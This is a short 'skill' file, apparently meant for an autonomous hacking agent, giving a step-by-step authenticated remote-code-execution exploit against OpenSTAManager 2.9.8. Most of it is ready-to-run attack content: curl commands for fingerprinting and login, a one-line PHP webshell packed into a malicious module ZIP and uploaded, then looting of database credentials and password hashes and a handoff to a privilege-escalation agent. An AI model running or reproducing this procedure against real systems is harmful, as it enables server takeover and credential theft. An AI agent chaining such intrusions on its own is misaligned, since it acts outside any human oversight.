# Skill: OpenSTAManager authenticated module-upload RCE (CVE-2026-38751)

Trigger: OpenSTAManager web app, fingerprint via `/assets/dist/css/app.min.css?v=<ver>`
(version in the `?v=` query; 2.9.8 vulnerable). Login page title "Login",
`<meta name="description" ... OpenSTAManager ...>`, nginx/PHP. You have any
valid admin creds.

Procedure:
1. Confirm version: `curl -s http://T/ | grep app.min.css` → `?v=2.9.8`.
2. Login (session cookie needed):
   `curl -is -c jar -d 'username=admin&password=PASS' http://T/?op=login`
   → 302 `Location: /controller.php?id_module=1`.
3. Enable the update checker:
   `curl -s -b jar -d 'Attiva aggiornamenti=1' 'http://T/ajax.php?a=check_module_updates_settings'`
4. Build a malicious module ZIP (no PHP validation, extracted under `/modules/<dir>/`):
   - `shell/MODULE` containing `name/directory/version/compatibility/options/icon/parent`
   - `shell/shell.php` = `<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>`
   - `zip -r up.zip shell`
5. Upload:
   `curl -s -b jar -F 'blob=@up.zip;type=application/zip;filename=update.zip' http://T/modules/aggiornamenti/upload_modules.php`
6. Verify + use:
   `curl -s --data-urlencode 'c=id' -G 'http://T/modules/shell/shell.php'` → `uid=33(www-data)`.
7. Loot from webshell: `config.inc.php` (DB creds), `mysql ... zz_users` (bcrypt
   hashes), `ss -tlnp` for localhost-only services. Hand shell to linux-privesc-agent.

Pitfalls:
- Hostnames with underscores (`support_001.example.htb`) fail glibc getaddrinfo:
  use `curl --resolve host:80:IP`. For scripts, monkey-patch
  `urllib3.util.connection.create_connection`.
- The `check_module_updates_settings` call is required or the upload endpoint
  rejects/302s.
- Extraction dir comes from the `directory` field in MODULE; pick something unique
  to avoid clobbering and remember to remove it during cleanup.
